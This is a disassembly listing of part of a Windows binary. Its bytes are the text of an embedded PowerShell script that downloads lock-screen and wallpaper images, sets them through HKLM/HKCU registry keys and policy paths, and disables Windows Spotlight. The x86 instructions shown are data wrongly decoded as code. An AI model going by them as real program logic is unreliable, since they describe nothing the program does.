  404ad4:	5c                   	pop    %esp
  404ad5:	77 61                	ja     0x404b38
  404ad7:	6c                   	insb   (%dx),%es:(%edi)
  404ad8:	6c                   	insb   (%dx),%es:(%edi)
  404ad9:	70 61                	jo     0x404b3c
  404adb:	70 65                	jo     0x404b42
  404add:	72 2e                	jb     0x404b0d
  404adf:	6a 70                	push   $0x70
  404ae1:	67 22 20             	and    (%bx,%si),%ah
  404ae4:	0d 0a 0d 0a 49       	or     $0x490a0d0a,%eax
  404ae9:	6e                   	outsb  %ds:(%esi),(%dx)
  404aea:	76 6f                	jbe    0x404b5b
  404aec:	6b 65 2d 57          	imul   $0x57,0x2d(%ebp),%esp
  404af0:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404af4:	71 75                	jno    0x404b6b
  404af6:	65 73 74             	gs jae 0x404b6d
  404af9:	20 2d 55 72 69 20    	and    %ch,0x20697255
  404aff:	24 6c                	and    $0x6c,%al
  404b01:	6f                   	outsl  %ds:(%esi),(%dx)
  404b02:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  404b05:	6d                   	insl   (%dx),%es:(%edi)
  404b06:	61                   	popa
  404b07:	67 65 55             	addr16 gs push %ebp
  404b0a:	72 6c                	jb     0x404b78
  404b0c:	20 2d 4f 75 74 46    	and    %ch,0x4674754f
  404b12:	69 6c 65 20 24 6c 6f 	imul   $0x636f6c24,0x20(%ebp,%eiz,2),%ebp
  404b19:	63 
  404b1a:	6b 64 65 73 74       	imul   $0x74,0x73(%ebp,%eiz,2),%esp
  404b1f:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  404b26:	50                   	push   %eax
  404b27:	61                   	popa
  404b28:	74 68                	je     0x404b92
  404b2a:	0d 0a 49 6e 76       	or     $0x766e490a,%eax
  404b2f:	6f                   	outsl  %ds:(%esi),(%dx)
  404b30:	6b 65 2d 57          	imul   $0x57,0x2d(%ebp),%esp
  404b34:	65 62 52 65          	bound  %edx,%gs:0x65(%edx)
  404b38:	71 75                	jno    0x404baf
  404b3a:	65 73 74             	gs jae 0x404bb1
  404b3d:	20 2d 55 72 69 20    	and    %ch,0x20697255
  404b43:	24 77                	and    $0x77,%al
  404b45:	61                   	popa
  404b46:	6c                   	insb   (%dx),%es:(%edi)
  404b47:	6c                   	insb   (%dx),%es:(%edi)
  404b48:	69 6d 61 67 65 55 72 	imul   $0x72556567,0x61(%ebp),%ebp
  404b4f:	6c                   	insb   (%dx),%es:(%edi)
  404b50:	20 2d 4f 75 74 46    	and    %ch,0x4674754f
  404b56:	69 6c 65 20 24 77 61 	imul   $0x6c617724,0x20(%ebp,%eiz,2),%ebp
  404b5d:	6c 
  404b5e:	6c                   	insb   (%dx),%es:(%edi)
  404b5f:	64 65 73 74          	fs gs jae 0x404bd7
  404b63:	69 6e 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%esi),%ebp
  404b6a:	50                   	push   %eax
  404b6b:	61                   	popa
  404b6c:	74 68                	je     0x404bd6
  404b6e:	0d 0a 0d 0a 24       	or     $0x240a0d0a,%eax
  404b73:	6c                   	insb   (%dx),%es:(%edi)
  404b74:	6f                   	outsl  %ds:(%esi),(%dx)
  404b75:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  404b78:	6d                   	insl   (%dx),%es:(%edi)
  404b79:	61                   	popa
  404b7a:	67 65 50             	addr16 gs push %eax
  404b7d:	61                   	popa
  404b7e:	74 68                	je     0x404be8
  404b80:	20 3d 20 22 43 3a    	and    %bh,0x3a432220
  404b86:	5c                   	pop    %esp
  404b87:	6c                   	insb   (%dx),%es:(%edi)
  404b88:	6f                   	outsl  %ds:(%esi),(%dx)
  404b89:	63 6b 73             	arpl   %ebp,0x73(%ebx)
  404b8c:	63 72 65             	arpl   %esi,0x65(%edx)
  404b8f:	65 6e                	outsb  %gs:(%esi),(%dx)
  404b91:	2e 6a 70             	cs push $0x70
  404b94:	67 22 20             	and    (%bx,%si),%ah
  404b97:	0d 0a 24 77 61       	or     $0x6177240a,%eax
  404b9c:	6c                   	insb   (%dx),%es:(%edi)
  404b9d:	6c                   	insb   (%dx),%es:(%edi)
  404b9e:	69 6d 61 67 65 50 61 	imul   $0x61506567,0x61(%ebp),%ebp
  404ba5:	74 68                	je     0x404c0f
  404ba7:	20 3d 20 22 43 3a    	and    %bh,0x3a432220
  404bad:	5c                   	pop    %esp
  404bae:	77 61                	ja     0x404c11
  404bb0:	6c                   	insb   (%dx),%es:(%edi)
  404bb1:	6c                   	insb   (%dx),%es:(%edi)
  404bb2:	70 61                	jo     0x404c15
  404bb4:	70 65                	jo     0x404c1b
  404bb6:	72 2e                	jb     0x404be6
  404bb8:	6a 70                	push   $0x70
  404bba:	67 22 20             	and    (%bx,%si),%ah
  404bbd:	0d 0a 24 72 65       	or     $0x6572240a,%eax
  404bc2:	67 4b                	addr16 dec %ebx
  404bc4:	65 79 50             	gs jns 0x404c17
  404bc7:	61                   	popa
  404bc8:	74 68                	je     0x404c32
  404bca:	20 3d 20 22 48 4b    	and    %bh,0x4b482220
  404bd0:	4c                   	dec    %esp
  404bd1:	4d                   	dec    %ebp
  404bd2:	3a 5c 53 4f          	cmp    0x4f(%ebx,%edx,2),%bl
  404bd6:	46                   	inc    %esi
  404bd7:	54                   	push   %esp
  404bd8:	57                   	push   %edi
  404bd9:	41                   	inc    %ecx
  404bda:	52                   	push   %edx
  404bdb:	45                   	inc    %ebp
  404bdc:	5c                   	pop    %esp
  404bdd:	4d                   	dec    %ebp
  404bde:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  404be5:	74 5c                	je     0x404c43
  404be7:	57                   	push   %edi
  404be8:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  404bef:	43                   	inc    %ebx
  404bf0:	75 72                	jne    0x404c64
  404bf2:	72 65                	jb     0x404c59
  404bf4:	6e                   	outsb  %ds:(%esi),(%dx)
  404bf5:	74 56                	je     0x404c4d
  404bf7:	65 72 73             	gs jb  0x404c6d
  404bfa:	69 6f 6e 5c 50 65 72 	imul   $0x7265505c,0x6e(%edi),%ebp
  404c01:	73 6f                	jae    0x404c72
  404c03:	6e                   	outsb  %ds:(%esi),(%dx)
  404c04:	61                   	popa
  404c05:	6c                   	insb   (%dx),%es:(%edi)
  404c06:	69 7a 61 74 69 6f 6e 	imul   $0x6e6f6974,0x61(%edx),%edi
  404c0d:	43                   	inc    %ebx
  404c0e:	53                   	push   %ebx
  404c0f:	50                   	push   %eax
  404c10:	22 0d 0a 0d 0a 69    	and    0x690a0d0a,%cl
  404c16:	66 20 28             	data16 and %ch,(%eax)
  404c19:	21 28                	and    %ebp,(%eax)
  404c1b:	54                   	push   %esp
  404c1c:	65 73 74             	gs jae 0x404c93
  404c1f:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404c24:	20 2d 50 61 74 68    	and    %ch,0x68746150
  404c2a:	20 24 72             	and    %ah,(%edx,%esi,2)
  404c2d:	65 67 4b             	gs addr16 dec %ebx
  404c30:	65 79 50             	gs jns 0x404c83
  404c33:	61                   	popa
  404c34:	74 68                	je     0x404c9e
  404c36:	29 29                	sub    %ebp,(%ecx)
  404c38:	20 7b 0d             	and    %bh,0xd(%ebx)
  404c3b:	0a 20                	or     (%eax),%ah
  404c3d:	20 20                	and    %ah,(%eax)
  404c3f:	20 4e 65             	and    %cl,0x65(%esi)
  404c42:	77 2d                	ja     0x404c71
  404c44:	49                   	dec    %ecx
  404c45:	74 65                	je     0x404cac
  404c47:	6d                   	insl   (%dx),%es:(%edi)
  404c48:	20 2d 50 61 74 68    	and    %ch,0x68746150
  404c4e:	20 24 72             	and    %ah,(%edx,%esi,2)
  404c51:	65 67 4b             	gs addr16 dec %ebx
  404c54:	65 79 50             	gs jns 0x404ca7
  404c57:	61                   	popa
  404c58:	74 68                	je     0x404cc2
  404c5a:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404c60:	65 20 7c 20 4f       	and    %bh,%gs:0x4f(%eax,%eiz,1)
  404c65:	75 74                	jne    0x404cdb
  404c67:	2d 4e 75 6c 6c       	sub    $0x6c6c754e,%eax
  404c6c:	0d 0a 7d 0d 0a       	or     $0xa0d7d0a,%eax
  404c71:	0d 0a 53 65 74       	or     $0x7465530a,%eax
  404c76:	2d 49 74 65 6d       	sub    $0x6d657449,%eax
  404c7b:	50                   	push   %eax
  404c7c:	72 6f                	jb     0x404ced
  404c7e:	70 65                	jo     0x404ce5
  404c80:	72 74                	jb     0x404cf6
  404c82:	79 20                	jns    0x404ca4
  404c84:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404c89:	20 24 72             	and    %ah,(%edx,%esi,2)
  404c8c:	65 67 4b             	gs addr16 dec %ebx
  404c8f:	65 79 50             	gs jns 0x404ce2
  404c92:	61                   	popa
  404c93:	74 68                	je     0x404cfd
  404c95:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  404c9b:	20 22                	and    %ah,(%edx)
  404c9d:	4c                   	dec    %esp
  404c9e:	6f                   	outsl  %ds:(%esi),(%dx)
  404c9f:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404ca2:	63 72 65             	arpl   %esi,0x65(%edx)
  404ca5:	65 6e                	outsb  %gs:(%esi),(%dx)
  404ca7:	49                   	dec    %ecx
  404ca8:	6d                   	insl   (%dx),%es:(%edi)
  404ca9:	61                   	popa
  404caa:	67 65 50             	addr16 gs push %eax
  404cad:	61                   	popa
  404cae:	74 68                	je     0x404d18
  404cb0:	22 20                	and    (%eax),%ah
  404cb2:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  404cb7:	65 20 24 6c          	and    %ah,%gs:(%esp,%ebp,2)
  404cbb:	6f                   	outsl  %ds:(%esi),(%dx)
  404cbc:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  404cbf:	6d                   	insl   (%dx),%es:(%edi)
  404cc0:	61                   	popa
  404cc1:	67 65 50             	addr16 gs push %eax
  404cc4:	61                   	popa
  404cc5:	74 68                	je     0x404d2f
  404cc7:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404ccd:	65 0d 0a 0d 0a 24    	gs or  $0x240a0d0a,%eax
  404cd3:	63 6f 6e             	arpl   %ebp,0x6e(%edi)
  404cd6:	74 65                	je     0x404d3d
  404cd8:	6e                   	outsb  %ds:(%esi),(%dx)
  404cd9:	74 44                	je     0x404d1f
  404cdb:	65 6c                	gs insb (%dx),%es:(%edi)
  404cdd:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404ce4:	6e                   	outsb  %ds:(%esi),(%dx)
  404ce5:	61                   	popa
  404ce6:	67 65 72 4b          	addr16 gs jb 0x404d35
  404cea:	65 79 20             	gs jns 0x404d0d
  404ced:	3d 20 22 48 4b       	cmp    $0x4b482220,%eax
  404cf2:	43                   	inc    %ebx
  404cf3:	55                   	push   %ebp
  404cf4:	3a 5c 53 4f          	cmp    0x4f(%ebx,%edx,2),%bl
  404cf8:	46                   	inc    %esi
  404cf9:	54                   	push   %esp
  404cfa:	57                   	push   %edi
  404cfb:	41                   	inc    %ecx
  404cfc:	52                   	push   %edx
  404cfd:	45                   	inc    %ebp
  404cfe:	5c                   	pop    %esp
  404cff:	4d                   	dec    %ebp
  404d00:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  404d07:	74 5c                	je     0x404d65
  404d09:	57                   	push   %edi
  404d0a:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  404d11:	43                   	inc    %ebx
  404d12:	75 72                	jne    0x404d86
  404d14:	72 65                	jb     0x404d7b
  404d16:	6e                   	outsb  %ds:(%esi),(%dx)
  404d17:	74 56                	je     0x404d6f
  404d19:	65 72 73             	gs jb  0x404d8f
  404d1c:	69 6f 6e 5c 43 6f 6e 	imul   $0x6e6f435c,0x6e(%edi),%ebp
  404d23:	74 65                	je     0x404d8a
  404d25:	6e                   	outsb  %ds:(%esi),(%dx)
  404d26:	74 44                	je     0x404d6c
  404d28:	65 6c                	gs insb (%dx),%es:(%edi)
  404d2a:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404d31:	6e                   	outsb  %ds:(%esi),(%dx)
  404d32:	61                   	popa
  404d33:	67 65 72 22          	addr16 gs jb 0x404d59
  404d37:	0d 0a 69 66 20       	or     $0x2066690a,%eax
  404d3c:	28 54 65 73          	sub    %dl,0x73(%ebp,%eiz,2)
  404d40:	74 2d                	je     0x404d6f
  404d42:	50                   	push   %eax
  404d43:	61                   	popa
  404d44:	74 68                	je     0x404dae
  404d46:	20 2d 50 61 74 68    	and    %ch,0x68746150
  404d4c:	20 24 63             	and    %ah,(%ebx,%eiz,2)
  404d4f:	6f                   	outsl  %ds:(%esi),(%dx)
  404d50:	6e                   	outsb  %ds:(%esi),(%dx)
  404d51:	74 65                	je     0x404db8
  404d53:	6e                   	outsb  %ds:(%esi),(%dx)
  404d54:	74 44                	je     0x404d9a
  404d56:	65 6c                	gs insb (%dx),%es:(%edi)
  404d58:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404d5f:	6e                   	outsb  %ds:(%esi),(%dx)
  404d60:	61                   	popa
  404d61:	67 65 72 4b          	addr16 gs jb 0x404db0
  404d65:	65 79 29             	gs jns 0x404d91
  404d68:	20 7b 0d             	and    %bh,0xd(%ebx)
  404d6b:	0a 20                	or     (%eax),%ah
  404d6d:	20 20                	and    %ah,(%eax)
  404d6f:	20 53 65             	and    %dl,0x65(%ebx)
  404d72:	74 2d                	je     0x404da1
  404d74:	49                   	dec    %ecx
  404d75:	74 65                	je     0x404ddc
  404d77:	6d                   	insl   (%dx),%es:(%edi)
  404d78:	50                   	push   %eax
  404d79:	72 6f                	jb     0x404dea
  404d7b:	70 65                	jo     0x404de2
  404d7d:	72 74                	jb     0x404df3
  404d7f:	79 20                	jns    0x404da1
  404d81:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404d86:	20 24 63             	and    %ah,(%ebx,%eiz,2)
  404d89:	6f                   	outsl  %ds:(%esi),(%dx)
  404d8a:	6e                   	outsb  %ds:(%esi),(%dx)
  404d8b:	74 65                	je     0x404df2
  404d8d:	6e                   	outsb  %ds:(%esi),(%dx)
  404d8e:	74 44                	je     0x404dd4
  404d90:	65 6c                	gs insb (%dx),%es:(%edi)
  404d92:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404d99:	6e                   	outsb  %ds:(%esi),(%dx)
  404d9a:	61                   	popa
  404d9b:	67 65 72 4b          	addr16 gs jb 0x404dea
  404d9f:	65 79 20             	gs jns 0x404dc2
  404da2:	2d 4e 61 6d 65       	sub    $0x656d614e,%eax
  404da7:	20 22                	and    %ah,(%edx)
  404da9:	52                   	push   %edx
  404daa:	6f                   	outsl  %ds:(%esi),(%dx)
  404dab:	74 61                	je     0x404e0e
  404dad:	74 69                	je     0x404e18
  404daf:	6e                   	outsb  %ds:(%esi),(%dx)
  404db0:	67 4c                	addr16 dec %esp
  404db2:	6f                   	outsl  %ds:(%esi),(%dx)
  404db3:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404db6:	63 72 65             	arpl   %esi,0x65(%edx)
  404db9:	65 6e                	outsb  %gs:(%esi),(%dx)
  404dbb:	45                   	inc    %ebp
  404dbc:	6e                   	outsb  %ds:(%esi),(%dx)
  404dbd:	61                   	popa
  404dbe:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  404dc2:	22 20                	and    (%eax),%ah
  404dc4:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  404dc9:	65 20 30             	and    %dh,%gs:(%eax)
  404dcc:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404dd2:	65 0d 0a 20 20 20    	gs or  $0x2020200a,%eax
  404dd8:	20 53 65             	and    %dl,0x65(%ebx)
  404ddb:	74 2d                	je     0x404e0a
  404ddd:	49                   	dec    %ecx
  404dde:	74 65                	je     0x404e45
  404de0:	6d                   	insl   (%dx),%es:(%edi)
  404de1:	50                   	push   %eax
  404de2:	72 6f                	jb     0x404e53
  404de4:	70 65                	jo     0x404e4b
  404de6:	72 74                	jb     0x404e5c
  404de8:	79 20                	jns    0x404e0a
  404dea:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404def:	20 24 63             	and    %ah,(%ebx,%eiz,2)
  404df2:	6f                   	outsl  %ds:(%esi),(%dx)
  404df3:	6e                   	outsb  %ds:(%esi),(%dx)
  404df4:	74 65                	je     0x404e5b
  404df6:	6e                   	outsb  %ds:(%esi),(%dx)
  404df7:	74 44                	je     0x404e3d
  404df9:	65 6c                	gs insb (%dx),%es:(%edi)
  404dfb:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404e02:	6e                   	outsb  %ds:(%esi),(%dx)
  404e03:	61                   	popa
  404e04:	67 65 72 4b          	addr16 gs jb 0x404e53
  404e08:	65 79 20             	gs jns 0x404e2b
  404e0b:	2d 4e 61 6d 65       	sub    $0x656d614e,%eax
  404e10:	20 22                	and    %ah,(%edx)
  404e12:	52                   	push   %edx
  404e13:	6f                   	outsl  %ds:(%esi),(%dx)
  404e14:	74 61                	je     0x404e77
  404e16:	74 69                	je     0x404e81
  404e18:	6e                   	outsb  %ds:(%esi),(%dx)
  404e19:	67 4c                	addr16 dec %esp
  404e1b:	6f                   	outsl  %ds:(%esi),(%dx)
  404e1c:	63 6b 53             	arpl   %ebp,0x53(%ebx)
  404e1f:	63 72 65             	arpl   %esi,0x65(%edx)
  404e22:	65 6e                	outsb  %gs:(%esi),(%dx)
  404e24:	4f                   	dec    %edi
  404e25:	76 65                	jbe    0x404e8c
  404e27:	72 6c                	jb     0x404e95
  404e29:	61                   	popa
  404e2a:	79 45                	jns    0x404e71
  404e2c:	6e                   	outsb  %ds:(%esi),(%dx)
  404e2d:	61                   	popa
  404e2e:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  404e32:	22 20                	and    (%eax),%ah
  404e34:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  404e39:	65 20 30             	and    %dh,%gs:(%eax)
  404e3c:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404e42:	65 0d 0a 20 20 20    	gs or  $0x2020200a,%eax
  404e48:	20 53 65             	and    %dl,0x65(%ebx)
  404e4b:	74 2d                	je     0x404e7a
  404e4d:	49                   	dec    %ecx
  404e4e:	74 65                	je     0x404eb5
  404e50:	6d                   	insl   (%dx),%es:(%edi)
  404e51:	50                   	push   %eax
  404e52:	72 6f                	jb     0x404ec3
  404e54:	70 65                	jo     0x404ebb
  404e56:	72 74                	jb     0x404ecc
  404e58:	79 20                	jns    0x404e7a
  404e5a:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404e5f:	20 24 63             	and    %ah,(%ebx,%eiz,2)
  404e62:	6f                   	outsl  %ds:(%esi),(%dx)
  404e63:	6e                   	outsb  %ds:(%esi),(%dx)
  404e64:	74 65                	je     0x404ecb
  404e66:	6e                   	outsb  %ds:(%esi),(%dx)
  404e67:	74 44                	je     0x404ead
  404e69:	65 6c                	gs insb (%dx),%es:(%edi)
  404e6b:	69 76 65 72 79 4d 61 	imul   $0x614d7972,0x65(%esi),%esi
  404e72:	6e                   	outsb  %ds:(%esi),(%dx)
  404e73:	61                   	popa
  404e74:	67 65 72 4b          	addr16 gs jb 0x404ec3
  404e78:	65 79 20             	gs jns 0x404e9b
  404e7b:	2d 4e 61 6d 65       	sub    $0x656d614e,%eax
  404e80:	20 22                	and    %ah,(%edx)
  404e82:	53                   	push   %ebx
  404e83:	75 62                	jne    0x404ee7
  404e85:	73 63                	jae    0x404eea
  404e87:	72 69                	jb     0x404ef2
  404e89:	62 65 64             	bound  %esp,0x64(%ebp)
  404e8c:	43                   	inc    %ebx
  404e8d:	6f                   	outsl  %ds:(%esi),(%dx)
  404e8e:	6e                   	outsb  %ds:(%esi),(%dx)
  404e8f:	74 65                	je     0x404ef6
  404e91:	6e                   	outsb  %ds:(%esi),(%dx)
  404e92:	74 2d                	je     0x404ec1
  404e94:	33 33                	xor    (%ebx),%esi
  404e96:	38 33                	cmp    %dh,(%ebx)
  404e98:	38 37                	cmp    %dh,(%edi)
  404e9a:	45                   	inc    %ebp
  404e9b:	6e                   	outsb  %ds:(%esi),(%dx)
  404e9c:	61                   	popa
  404e9d:	62 6c 65 64          	bound  %ebp,0x64(%ebp,%eiz,2)
  404ea1:	22 20                	and    (%eax),%ah
  404ea3:	2d 56 61 6c 75       	sub    $0x756c6156,%eax
  404ea8:	65 20 30             	and    %dh,%gs:(%eax)
  404eab:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  404eb1:	65 20 23             	and    %ah,%gs:(%ebx)
  404eb4:	20 44 69 73          	and    %al,0x73(%ecx,%ebp,2)
  404eb8:	61                   	popa
  404eb9:	62 6c 65 73          	bound  %ebp,0x73(%ebp,%eiz,2)
  404ebd:	20 53 70             	and    %dl,0x70(%ebx)
  404ec0:	6f                   	outsl  %ds:(%esi),(%dx)
  404ec1:	74 6c                	je     0x404f2f
  404ec3:	69 67 68 74 0d 0a 7d 	imul   $0x7d0a0d74,0x68(%edi),%esp
  404eca:	0d 0a 0d 0a 57       	or     $0x570a0d0a,%eax
  404ecf:	72 69                	jb     0x404f3a
  404ed1:	74 65                	je     0x404f38
  404ed3:	2d 48 6f 73 74       	sub    $0x74736f48,%eax
  404ed8:	20 22                	and    %ah,(%edx)
  404eda:	4c                   	dec    %esp
  404edb:	6f                   	outsl  %ds:(%esi),(%dx)
  404edc:	63 6b 20             	arpl   %ebp,0x20(%ebx)
  404edf:	73 63                	jae    0x404f44
  404ee1:	72 65                	jb     0x404f48
  404ee3:	65 6e                	outsb  %gs:(%esi),(%dx)
  404ee5:	20 69 6d             	and    %ch,0x6d(%ecx)
  404ee8:	61                   	popa
  404ee9:	67 65 20 73 65       	and    %dh,%gs:0x65(%bp,%di)
  404eee:	74 20                	je     0x404f10
  404ef0:	74 6f                	je     0x404f61
  404ef2:	3a 20                	cmp    (%eax),%ah
  404ef4:	24 6c                	and    $0x6c,%al
  404ef6:	6f                   	outsl  %ds:(%esi),(%dx)
  404ef7:	63 6b 69             	arpl   %ebp,0x69(%ebx)
  404efa:	6d                   	insl   (%dx),%es:(%edi)
  404efb:	61                   	popa
  404efc:	67 65 50             	addr16 gs push %eax
  404eff:	61                   	popa
  404f00:	74 68                	je     0x404f6a
  404f02:	22 0d 0a 0d 0a 53    	and    0x530a0d0a,%cl
  404f08:	65 74 2d             	gs je  0x404f38
  404f0b:	49                   	dec    %ecx
  404f0c:	74 65                	je     0x404f73
  404f0e:	6d                   	insl   (%dx),%es:(%edi)
  404f0f:	50                   	push   %eax
  404f10:	72 6f                	jb     0x404f81
  404f12:	70 65                	jo     0x404f79
  404f14:	72 74                	jb     0x404f8a
  404f16:	79 20                	jns    0x404f38
  404f18:	2d 50 61 74 68       	sub    $0x68746150,%eax
  404f1d:	20 27                	and    %ah,(%edi)
  404f1f:	48                   	dec    %eax
  404f20:	4b                   	dec    %ebx
  404f21:	43                   	inc    %ebx
  404f22:	55                   	push   %ebp
  404f23:	3a 5c 43 6f          	cmp    0x6f(%ebx,%eax,2),%bl
  404f27:	6e                   	outsb  %ds:(%esi),(%dx)
  404f28:	74 72                	je     0x404f9c
  404f2a:	6f                   	outsl  %ds:(%esi),(%dx)
  404f2b:	6c                   	insb   (%dx),%es:(%edi)
  404f2c:	20 50 61             	and    %dl,0x61(%eax)
  404f2f:	6e                   	outsb  %ds:(%esi),(%dx)
  404f30:	65 6c                	gs insb (%dx),%es:(%edi)
  404f32:	5c                   	pop    %esp
  404f33:	44                   	inc    %esp
  404f34:	65 73 6b             	gs jae 0x404fa2
  404f37:	74 6f                	je     0x404fa8
  404f39:	70 5c                	jo     0x404f97
  404f3b:	27                   	daa
  404f3c:	20 2d 4e 61 6d 65    	and    %ch,0x656d614e
  404f42:	20 27                	and    %ah,(%edi)
  404f44:	57                   	push   %edi
  404f45:	61                   	popa
  404f46:	6c                   	insb   (%dx),%es:(%edi)
  404f47:	6c                   	insb   (%dx),%es:(%edi)
  404f48:	50                   	push   %eax
  404f49:	61                   	popa
  404f4a:	70 65                	jo     0x404fb1
  404f4c:	72 27                	jb     0x404f75
  404f4e:	20 2d 56 61 6c 75    	and    %ch,0x756c6156
  404f54:	65 20 24 77          	and    %ah,%gs:(%edi,%esi,2)
  404f58:	61                   	popa
  404f59:	6c                   	insb   (%dx),%es:(%edi)
  404f5a:	6c                   	insb   (%dx),%es:(%edi)
  404f5b:	69 6d 61 67 65 50 61 	imul   $0x61506567,0x61(%ebp),%ebp
  404f62:	74 68                	je     0x404fcc
  404f64:	0d 0a 0d 0a 72       	or     $0x720a0d0a,%eax
  404f69:	75 6e                	jne    0x404fd9
  404f6b:	64 6c                	fs insb (%dx),%es:(%edi)
  404f6d:	6c                   	insb   (%dx),%es:(%edi)
  404f6e:	33 32                	xor    (%edx),%esi
  404f70:	2e 65 78 65          	cs js,pn 0x404fd9
  404f74:	20 75 73             	and    %dh,0x73(%ebp)
  404f77:	65 72 33             	gs jb  0x404fad
  404f7a:	32 2e                	xor    (%esi),%ch
  404f7c:	64 6c                	fs insb (%dx),%es:(%edi)
  404f7e:	6c                   	insb   (%dx),%es:(%edi)
  404f7f:	2c 20                	sub    $0x20,%al
  404f81:	55                   	push   %ebp
  404f82:	70 64                	jo     0x404fe8
  404f84:	61                   	popa
  404f85:	74 65                	je     0x404fec
  404f87:	50                   	push   %eax
  404f88:	65 72 55             	gs jb  0x404fe0
  404f8b:	73 65                	jae    0x404ff2
  404f8d:	72 53                	jb     0x404fe2
  404f8f:	79 73                	jns    0x405004
  404f91:	74 65                	je     0x404ff8
  404f93:	6d                   	insl   (%dx),%es:(%edi)
  404f94:	50                   	push   %eax
  404f95:	61                   	popa
  404f96:	72 61                	jb     0x404ff9
  404f98:	6d                   	insl   (%dx),%es:(%edi)
  404f99:	65 74 65             	gs je  0x405001
  404f9c:	72 73                	jb     0x405011
  404f9e:	20 31                	and    %dh,(%ecx)
  404fa0:	2c 20                	sub    $0x20,%al
  404fa2:	54                   	push   %esp
  404fa3:	72 75                	jb     0x40501a
  404fa5:	65 0d 0a 0d 0a 24    	gs or  $0x240a0d0a,%eax
  404fab:	52                   	push   %edx
  404fac:	65 67 50             	gs addr16 push %eax
  404faf:	61                   	popa
  404fb0:	74 68                	je     0x40501a
  404fb2:	20 3d 20 22 48 4b    	and    %bh,0x4b482220
  404fb8:	43                   	inc    %ebx
  404fb9:	55                   	push   %ebp
  404fba:	3a 5c 53 6f          	cmp    0x6f(%ebx,%edx,2),%bl
  404fbe:	66 74 77             	data16 je 0x405038
  404fc1:	61                   	popa
  404fc2:	72 65                	jb     0x405029
  404fc4:	5c                   	pop    %esp
  404fc5:	4d                   	dec    %ebp
  404fc6:	69 63 72 6f 73 6f 66 	imul   $0x666f736f,0x72(%ebx),%esp
  404fcd:	74 5c                	je     0x40502b
  404fcf:	57                   	push   %edi
  404fd0:	69 6e 64 6f 77 73 5c 	imul   $0x5c73776f,0x64(%esi),%ebp
  404fd7:	43                   	inc    %ebx
  404fd8:	75 72                	jne    0x40504c
  404fda:	72 65                	jb     0x405041
  404fdc:	6e                   	outsb  %ds:(%esi),(%dx)
  404fdd:	74 56                	je     0x405035
  404fdf:	65 72 73             	gs jb  0x405055
  404fe2:	69 6f 6e 5c 50 6f 6c 	imul   $0x6c6f505c,0x6e(%edi),%ebp
  404fe9:	69 63 69 65 73 5c 41 	imul   $0x415c7365,0x69(%ebx),%esp
  404ff0:	63 74 69 76          	arpl   %esi,0x76(%ecx,%ebp,2)
  404ff4:	65 44                	gs inc %esp
  404ff6:	65 73 6b             	gs jae 0x405064
  404ff9:	74 6f                	je     0x40506a
  404ffb:	70 22                	jo     0x40501f
  404ffd:	0d 0a 0d 0a 49       	or     $0x490a0d0a,%eax
  405002:	66 20 28             	data16 and %ch,(%eax)
  405005:	2d 6e 6f 74 20       	sub    $0x20746f6e,%eax
  40500a:	28 54 65 73          	sub    %dl,0x73(%ebp,%eiz,2)
  40500e:	74 2d                	je     0x40503d
  405010:	50                   	push   %eax
  405011:	61                   	popa
  405012:	74 68                	je     0x40507c
  405014:	20 24 52             	and    %ah,(%edx,%edx,2)
  405017:	65 67 50             	gs addr16 push %eax
  40501a:	61                   	popa
  40501b:	74 68                	je     0x405085
  40501d:	29 29                	sub    %ebp,(%ecx)
  40501f:	20 7b 0d             	and    %bh,0xd(%ebx)
  405022:	0a 20                	or     (%eax),%ah
  405024:	20 20                	and    %ah,(%eax)
  405026:	20 4e 65             	and    %cl,0x65(%esi)
  405029:	77 2d                	ja     0x405058
  40502b:	49                   	dec    %ecx
  40502c:	74 65                	je     0x405093
  40502e:	6d                   	insl   (%dx),%es:(%edi)
  40502f:	20 2d 50 61 74 68    	and    %ch,0x68746150
  405035:	20 24 52             	and    %ah,(%edx,%edx,2)
  405038:	65 67 50             	gs addr16 push %eax
  40503b:	61                   	popa
  40503c:	74 68                	je     0x4050a6
  40503e:	20 2d 46 6f 72 63    	and    %ch,0x63726f46
  405044:	65 20 7c 20 4f       	and    %bh,%gs:0x4f(%eax,%eiz,1)
  405049:	75 74                	jne    0x4050bf
  40504b:	2d 4e 75 6c 6c       	sub    $0x6c6c754e,%eax
  405050:	0d 0a 7d 0d 0a       	or     $0xa0d7d0a,%eax
  405055:	0d 0a 53 65 74       	or     $0x7465530a,%eax
  40505a:	2d 49 74 65 6d       	sub    $0x6d657449,%eax
  40505f:	50                   	push   %eax
  405060:	72 6f                	jb     0x4050d1
